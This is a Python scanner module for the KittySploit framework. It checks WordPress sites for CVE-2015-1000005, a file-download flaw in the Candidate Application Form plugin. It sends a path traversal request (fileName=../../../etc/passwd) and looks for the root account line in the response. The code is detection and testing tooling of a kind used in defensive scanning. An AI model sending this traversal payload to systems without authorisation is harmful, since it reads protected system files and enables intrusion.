#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Candidate Application Form <= 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Candidate Application Form <= 1.3 - Local File Inclusion Detection',
        'description': 'WordPress Candidate Application Form <= 1.3 is susceptible to arbitrary file downloads because the code in downloadpdffile.php does not do any sanity checks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'wpscan', 'wordpress', 'wp-plugin', 'lfi', 'wp', 'candidate-application-form_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/446233e9-33b3-4024-9b7d-63f9bb1dafe0',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1000005',
            'http://www.vapidlabs.com/advisory.php?v=142',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-1000005',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Candidate Application Form <= 1.3 - Local File Inclusion detected",
                path='/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd',
            )
            return True
        return False

